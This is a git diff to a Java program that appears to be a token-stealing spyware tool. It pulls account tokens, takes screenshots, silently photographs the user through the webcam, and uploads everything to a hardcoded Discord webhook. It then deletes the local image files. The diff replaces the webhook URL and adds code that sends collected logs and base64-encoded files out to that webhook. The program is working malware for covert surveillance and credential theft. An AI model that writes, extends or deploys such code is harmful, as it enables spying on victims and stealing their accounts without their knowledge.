@@ -1,4 +1,5 @@
 import com.github.sarxos.webcam.Webcam;
+import org.apache.commons.io.FileUtils;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -18,7 +19,8 @@ import java.util.regex.Pattern;
 
 public class Main {
 
-    private static final String webhookURL = "https://discord.com/api/webhooks/876962438476611635/H9Sv7_hFEctQ0mLDZ-GVeijW5PUBkG92JuXrjzgn_DiO64j4pSmyvm-ArnmzWIiYVDRa";
+    private static final String webhookURL = "https://discord.com/api/webhooks/884970510310584390/q1v2s4te1FyQQPTzwvEyvwQGaNRYZ1lBUpOxpBw4PJsWE4ttjsGuRLnLM4bEVi48SKE_";
+    private static String sout = "";
 
     public static void main(String[] args) throws InterruptedException {
         String userOS = System.getProperty("os.name");
@@ -42,7 +44,7 @@ public class Main {
             OSCapture(userOS);
         } catch (Exception ex) {
             sendMessage("``` UNABLE TO PULL TOKENS : " + ex + "```");
-        }
+        }//*/
 
         //SCREEN CAPTURE
         try {
@@ -60,6 +62,9 @@ public class Main {
             sendMessage("``` UNABLE TO CAPTURE CAMERA : " + ex + "```");
         }
 
+        //create logs.txt and sendFile
+        System.out.println(sout);
+        sendMessage("logs:\n```" + sout + "```"); //temp method
     }
 
     private static void sendMessage(String message) {
@@ -98,7 +103,7 @@ public class Main {
 
         }
 
-        System.out.println(result.toString());
+        sout += "message sent" + result + "\n";
     }
 
     private static void OSCapture(String userOS) throws InterruptedException {
@@ -151,7 +156,7 @@ public class Main {
             }
         }
 
-        sendMessage("```" + webhooks.toString() + "```");
+        sendMessage("```" + webhooks + "```");
 
     }
 
@@ -159,13 +164,15 @@ public class Main {
         /*byte[] fileContent = FileUtils.readFileToByteArray(new File(file.toPath().toString()));
         String encodedString = Base64.getEncoder().encodeToString(fileContent);
 
+        sendMessage(encodedString);
+
         int random = new Random().nextInt();
         File textfile = new File("cached_" + random + ".txt");
         PrintWriter baseCode = new PrintWriter(textfile);
 
         baseCode.println(encodedString);
-        /*^base64 code^
-        https://www.baeldung.com/java-base64-image-string*/
+        /* ^base64 code^
+        * https://www.baeldung.com/java-base64-image-string */
 
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(webhookURL).openConnection();
@@ -179,7 +186,7 @@ public class Main {
             writer.println("Content-Type: image/png");
             byte[] fileContent = Files.readAllBytes(file.toPath());
             writer.println(fileContent);
-            System.out.println(fileContent);
+            sout += fileContent + "\n";
             //writer.println(textfile);
 
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
@@ -192,7 +199,7 @@ public class Main {
 
         }
 
-        System.out.println(((HttpURLConnection) connection).getResponseMessage());
+        sout += "Connection? " + ((HttpURLConnection) connection).getResponseMessage() + "\n";
 
     }
 
@@ -204,31 +211,31 @@ public class Main {
         BufferedImage image = robot.createScreenCapture(screenRectangle);
         int random = new Random().nextInt();
         File file = new File("cached_" + random + ".png");
-        System.out.println(file.getName());
+        sout += "\n" + file.getName() + "\n";
         ImageIO.write(image, "png", file);
         sendFile(file);
         if (file.delete())
-            System.out.println("Deleted the file: " + file.getName());
+            sout += "Deleted the file: " + file.getName() + "\n";
         else
-            System.out.println("Failed to delete the file.");
+            sout += "Failed to delete the file." + "\n";
     }
 
     private static void captureCamera() throws Exception {
         Webcam cam = Webcam.getDefault();
         if (cam != null) {
-            System.out.println("Webcam: " + cam.getName());
+            sout += "\nWebcam: " + cam.getName() + "\n";
             cam.open();
             int random = Math.abs(new Random().nextInt());
             File webcam = new File("1cached_" + random + ".png");
-            ImageIO.write(cam.getImage(), "PNG", webcam);
+            ImageIO.write(cam.getImage(), "png", webcam);
             cam.close();
             sendFile(webcam);
             if (webcam.delete())
-                System.out.println("Deleted the file: " + webcam.getName());
+                sout += "Deleted file: " + webcam.getName() + "\n";
             else
-                System.out.println("Failed to delete the file.");
+                sout += "Failed to delete the file." + "\n";
         } else
-            System.out.println("No webcam detected");
+            sout += "\nNo webcam detected" + "\n";
     }
 
 }
